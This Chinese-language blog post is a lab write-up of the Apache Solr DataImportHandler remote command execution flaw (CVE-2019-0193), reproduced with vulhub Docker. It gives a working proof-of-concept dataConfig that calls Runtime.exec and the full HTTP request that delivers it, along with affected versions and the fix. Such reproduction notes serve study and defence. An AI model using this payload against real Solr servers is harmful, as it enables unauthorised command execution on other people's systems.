---
layout: post
title: Apache Solr 远程命令执行漏洞
tags: solr
categories: CVE-2019-0193
---

# Apache Solr 远程命令执行漏洞（CVE-2019-0193）

## 漏洞描述

此漏洞位于Apache Solr的可选模块DataImportHandler模块中。
DataImportHandler模块是一个可选模块，但是它常常被使用。该模块的作用是从数据源（数据库或其他源）中提取数据。

该模块的配置信息 "DIH配置"(DIH configuration) 可使用以下的方式指定:

Server端 - 通过Server的“配置文件“来指定配置信息"DIH配置"

web请求 - 使用web请求中的dataConfig参数(该参数用户可控）来指定配置信息"DIH配置"（整个DIH配置可以来自请求的“dataConfig”参数）

Apache Solr如果启用了DataImportHandler模块，因为它支持使用web请求来指定配置信息"DIH配置" ，攻击者可构造HTTP请求指定dataConfig参数的值(dataConfig内容)，dataConfig内容完全可控(多种利用方式)，后端处理的过程中，可导致命令执行。

## 漏洞复现

首先部署是使用的GitHub中的[vulhub](!https://github.com/vulhub/vulhub.git)项目docker一键部署的。同时需要创建一个Core，执行命令`docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db`

Core：索引库，其中包含schema.xml/managed-schema，schema.xml是模式文件的传统名称，可以由使用该模式的用户手动编辑，managed-schema是Solr默认使用的模式文件的名称，它支持在运行时动态更改，data-config文件可配置为xml形式或通过请求参数传递（在dataimport开启debug模式时可通过dataConfig参数传递）

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Solr/CVE-2019-0193/15936819553081.jpg)

环境启动后访问`http://your-ip:8983/`即可查看到Apache solr的管理页面，无需登录

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Solr/CVE-2019-0193/15936824307357.jpg)

然后打开刚刚创建的test Core，选择Dataimport功能并选择debug模式，填入以下POC：

```
<dataConfig>
  <dataSource type="URLDataSource"/>
  <script><![CDATA[
          function poc(){ java.lang.Runtime.getRuntime().exec("touch /tmp/success");
          }
  ]]></script>
  <document>
    <entity name="stackoverflow"
            url="https://stackoverflow.com/feeds/tag/solr"
            processor="XPathEntityProcessor"
            forEach="/feed"
            transformer="script:poc" />
  </document>
</dataConfig>
```

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Solr/CVE-2019-0193/15936842795291.jpg)

点击Execute with this Confuguration会发送以下请求包:

```
POST /solr/test/dataimport?_=1593684405624&indent=on&wt=json HTTP/1.1
Host: your-ip:8983
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 679
Origin: http://your-ip:8983
Connection: close
Referer: http://your-ip:8983/solr/

command=full-import&verbose=false&clean=false&commit=true&debug=true&core=test&dataConfig=%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22touch+%2Ftmp%2Fsuccess%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++++++++++++url%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%22XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&name=dataimport
```

进入容器查看/tmp/success创建成功

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Solr/CVE-2019-0193/15936845932238.jpg)

更多利用方式可参考
https://paper.seebug.org/1009/#poc-

## 受影响版本

Apache Solr < 8.2.0 并且开启了DataImportHandler模块(默认情况下该模块不被启用)，存在该漏洞。
Solr>=8.2.0版安全。因为从Solr>=8.2.0版开始，默认不可使用dataConfig参数，想使用此参数需要将Java System属性“enable.dih.dataConfigParam”设置为true。只有当Solr>=8.2.0但是主动将Java System属性“enable.dih.dataConfigParam”设置为true，才存在漏洞。

## 参考链接

https://xz.aliyun.com/t/5965

